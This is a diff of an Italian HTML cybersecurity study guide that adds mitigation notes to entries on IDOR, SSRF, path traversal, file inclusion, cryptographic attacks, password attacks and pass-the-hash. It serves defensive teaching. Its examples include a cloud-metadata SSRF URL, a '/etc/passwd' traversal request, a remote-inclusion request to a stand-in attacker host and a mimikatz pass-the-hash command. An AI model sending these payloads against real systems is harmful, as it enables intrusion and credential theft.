       <br>Se l'applicazione è affetta da una vulnerabilità logica di tipo IDOR (Insecure Direct Object Reference) e non verifica se l'utenza correntemente loggata possiede realmente i diritti per visualizzare la risorsa richiesta, l'utente può semplicemente modificare a mano il parametro nell'URL in <code>account_id=7411</code>. Di conseguenza riceverà l'estratto conto riservato di un altro cliente, compiendo un'escalation orizzontale.
     </dd>
+    <dt>Mitigazione principale</dt>
+    <dd>Applicazione ferrea del principio del minimo privilegio (Principle of Least Privilege), rimozione sistematica del bit SUID non necessario su file eseguibili, esecuzione automatizzata di patch di sicurezza per sanare falle del kernel locale, e implementazione di controlli di accesso granulari e validazione lato server per impedire vulnerabilità IDOR tramite controllo di sessione ad ogni chiamata.</dd>
   </dl>
 
   <h4 style="color: var(--navy); margin-top: 20px; margin-bottom: 5px;">2. I Livelli Operativi della CPU: User Mode vs Kernel Mode</h4>
@@ -869,7 +892,7 @@
     </dd>
 
     <dt>2. SSRF — Server-Side Request Forgery (Falsificazione lato server)</dt>
-    <dd>A differenza di CSRF (dove l'attaccante induce il browser del client a fare chiamate), in un attacco <strong>SSRF</strong> l'attaccante induce il <strong>server web stesso</strong> a fare chiamate di rete arbitrarie a proprio nome. Sfruttando campi di input in cui l'applicazione accetta URL esterni (es. "inserisci URL della foto profilo per caricarla"), l'attaccante invia indirizzi privati interni all'infrastruttura (es: <code>http://localhost:8080/admin</code> o <code>http://169.254.169.254/latest/meta-data/</code> su cloud come AWS per leggere credenziali IAM di accesso). Il server bersaglio fa da ponte, permettendo all'hacker di bypassare firewall e reti interne isolate dall'esterno.</dd>
+    <dd>A differenza di CSRF (dove l'attaccante induce il browser del client a fare chiamate), in un attacco <strong>SSRF</strong> l'attaccante induce il <strong>server web stesso</strong> a fare chiamate di rete arbitrarie a proprio nome. Sfruttando campi di input in cui l'applicazione accetta URL esterni (es. "inserisci URL della foto profilo per caricarla"), l'attaccante invia indirizzi privati interni all'infrastruttura (es: <code>http://localhost:8080/admin</code> o <code>http://169.254.169.254/latest/meta-data/</code> su cloud come AWS per leggere credenziali IAM di accesso). Il server bersaglio fa da ponte, permettendo all'hacker di bypassare firewall e reti interne isolate dall'esterno.<br><strong>• Mitigazioni principali:</strong> Implementazione di una <strong>Whitelist di domini</strong> consentiti per le richieste esterne del server; divieto assoluto di risolvere IP privati (RFC 1918) o locali (loopback); disabilitazione delle query verso l'endpoint per i metadata del cloud (<code>169.254.169.254</code>); e isolamento stretto delle macchine in DMZ.</dd>
   </dl>
 
   <h3 id="dir-trav">Directory Traversal e File Inclusion (Log Analysis)</h3>
@@ -880,14 +903,17 @@
     <dt>Indicatore Directory Traversal (Path Traversal)</dt>
     <dd>Presenza di sequenze di retrocessione <code>../</code> o <code>..\</code> inserite in richieste GET/POST che puntano a directory riservate di sistema.
       <br><strong>Esempio di Log:</strong> <code>192.168.1.10 - - [24/May/2026:10:14:00] "GET /view.php?file=../../../../etc/passwd HTTP/1.1" 200 1024</code> (l'attaccante ha letto con successo il file passwd come indicato dal codice di ritorno HTTP 200).
+      <br><strong>• Mitigazione principale:</strong> Uso di una whitelist rigida nei nomi dei file accettati, normalizzazione logica dei percorsi (canonicalization) prima del loro utilizzo, posizionamento delle risorse al di fuori del web root, e divieto assoluto di accettare input dell'utente per funzioni di I/O su filesystem.
     </dd>
     <dt>Indicatore Local File Inclusion (LFI)</dt>
     <dd>Richiesta di file interni o risonanti insoliti (es: log di sistema, immagini contenenti codice incorporato, sessioni d'utente) passati come parametri ad interpreti di pagina.
       <br><strong>Esempio di Log:</strong> <code>192.168.1.10 - - [24/May/2026:10:15:20] "GET /index.php?page=uploads/avatar.jpg HTTP/1.1" 200 512</code>.
+      <br><strong>• Mitigazione principale:</strong> Evitare per quanto possibile l'inclusione dinamica dei percorsi, preferendo invece un'associazione rigida a ID fissi (es. <code>1 = home, 2 = about</code>) ed eseguendo la validazione robusta dei tipi di file.
     </dd>
     <dt>Indicatore Remote File Inclusion (RFI)</dt>
     <dd>Parametri URL completi di protocollo (<code>http://</code>, <code>https://</code>, <code>ftp://</code>) che puntano a domini esterni sconosciuti o IP pubblici arbitrari trasmessi a parametri interni di caricamento file o template.
       <br><strong>Esempio di Log:</strong> <code>192.168.1.10 - - [24/May/2026:10:16:45] "GET /index.php?page=http://attacker-server.com/malware.txt HTTP/1.1" 200 4096</code>.
+      <br><strong>• Mitigazione principale:</strong> Disabilitazione della direttiva di caricamento URL dinamico remoto nel file di configurazione dell'interprete (es. impostando <code>allow_url_include = Off</code> in PHP), e limitazione rigorosa del traffico in uscita generato dai server web.
     </dd>
   </dl>
 </section>
@@ -900,11 +926,11 @@
   <h3 id="crypto-attacks">Downgrade · Collision · Birthday</h3>
   <dl class="termlist">
     <dt>Downgrade attack (Attacco di degradazione)</dt>
-    <dd>Forza due sistemi a usare una versione più vecchia e vulnerabile di un protocollo crittografico, invece di quella sicura negoziata originariamente. Esempio classico: POODLE (forzava da TLS a SSLv3), BEAST (forzava TLS 1.0). Indicatore: negoziazione di protocolli obsoleti (SSL, TLS 1.0) nonostante la disponibilità di versioni moderne.</dd>
+    <dd>Forza due sistemi a usare una versione più vecchia e vulnerabile di un protocollo crittografico, invece di quella sicura negoziata originariamente. Esempio classico: POODLE (forzava da TLS a SSLv3), BEAST (forzava TLS 1.0). Indicatore: negoziazione di protocolli obsoleti (SSL, TLS 1.0) nonostante la disponibilità di versioni moderne.<br><strong>• Mitigazione principale:</strong> Disabilitazione completa a livello server e client di librerie o protocolli deprecati (SSLv2, SSLv3, TLS 1.0, TLS 1.1) a favore del solo TLS 1.2 o TLS 1.3, unito all'uso di robusti cipher suites e di HSTS (HTTP Strict Transport Security) per vietare fallback in chiaro.</dd>
     <dt>Collision attack (Attacco di collisione)</dt>
-    <dd>Trova due input diversi che producono lo stesso hash (collisione). Se l'algoritmo di hashing è debole (MD5, SHA-1), l'attaccante può creare un file malevolo con lo stesso hash di un file legittimo: il sistema di verifica dell'integrità non rileva la sostituzione. Indicatore: due file con hash identico ma contenuto diverso.</dd>
+    <dd>Trova due input diversi che producono lo stesso hash (collisione). Se l'algoritmo di hashing è debole (MD5, SHA-1), l'attaccante può creare un file malevolo con lo stesso hash di un file legittimo: il sistema di verifica dell'integrità non rileva la sostituzione. Indicatore: due file con hash identico ma contenuto diverso.<br><strong>• Mitigazione principale:</strong> Utilizzo rigoroso e vincolante di algoritmi di hashing moderni e sicuri (come SHA-256, SHA-384, SHA-3) bandendo l'uso operativo di algoritmi insicuri o rotti quali l'MD5 o lo SHA-1.</dd>
     <dt>Birthday attack (Attacco del compleanno)</dt>
-    <dd>Sfrutta il paradosso del compleanno della teoria della probabilità: con N possibili valori di hash, bastano √N input casuali per avere probabilità del 50% di trovare una collisione. È il fondamento matematico degli attacchi di collisione. Indica la necessità di hash più lunghi per resistere a questi attacchi.</dd>
+    <dd>Sfrutta il paradosso del compleanno della teoria della probabilità: con N possibili valori di hash, bastano √N input casuali per avere probabilità del 50% di trovare una collisione. È il fondamento matematico degli attacchi di collisione. Indica la necessità di hash più lunghi per resistere a questi attacchi.<br><strong>• Mitigazione principale:</strong> Pretesa dell'adozione di chiavi di cifratura ed impronte (hash) caratterizzate da dimensioni in bit molto elevate (SHA-256 produce 256 bit di spazio di indirizzamento, alzando la soglia del birthday attack a 2^128 operazioni necessarie, che risulta computazionalmente inavvicinabile).</dd>
   </dl>
 </section>
 
@@ -939,6 +965,8 @@
     <dd>Un attacco altamente automatizzato in cui gli hacker pasturano script automatici con imponenti database di combinazioni <strong>username/password compromesse da precedenti violazioni (leaked)</strong> su altri siti web. L'attacco tenta di autenticarsi su centinaia di noti servizi online alternativi (es: e-commerce, banche, social network) speculando sull'abitudine diffusa degli utenti di **riutilizzare le medesime credenziali di accesso** su canali diversi. Non è brute force, poiché le coppie testate non sono casuali né generate al volo, ma derivano da credenziali reali violate altrove.</dd>
     <dt>Differenza operativa chiave</dt>
     <dd>Spraying: 1 password × N account → evita lockout. Brute-force: N password × 1 account → causa lockout. Credential Stuffing: Coppie note (User/Password) × N account in modo mirato.</dd>
+    <dt>Mitigazione principale dei Password Attacks</dt>
+    <dd>Uso tassativo di <strong>Multi-Factor Authentication (MFA)</strong> per invalidare credenziali compromesse; impostazione di regole di lockout intelligenti basate sulla geolocalizzazione e sull'indirizzo IP; integrazione dei sistemi CAPTCHA sulle schermate di login; e monitoraggio attivo tramite feed OSINT per forzare il cambio password degli utenti le cui credenziali risultino trapelate sul Dark Web.</dd>
   </dl>
 
   <h3 id="pass-hash">Pass-the-hash</h3>
@@ -949,6 +977,9 @@
     password: se l'attaccante ha l'hash, può autenticarsi esattamente come se avesse
     la password. Lo strumento principale è <code>mimikatz</code> con il modulo
     <code>sekurlsa::pth</code>.
+  </p>
+  <p>
+    <strong>• Mitigazioni principali:</strong> Disattivazione o drastica limitazione del protocollo obsoleto NTLM sul dominio Active Directory a favore del protocollo sicuro <strong>Kerberos</strong>; abilitazione di funzionalità hardware e logiche avanzate come <strong>Windows Defender Credential Guard</strong> per isolare lo spazio di indirizzamento LSASS da accessi non autorizzati; inserimento degli account sensibili nel gruppo di sicurezza blindato <strong>"Protected Users"</strong>; e sanificazione periodica dei sistemi per svuotare le credenziali memorizzate in cache ed evitare che amministratori locali aprano sessioni RDP persistenti su host potenzialmente compromessi.
   </p>
 </section>
 
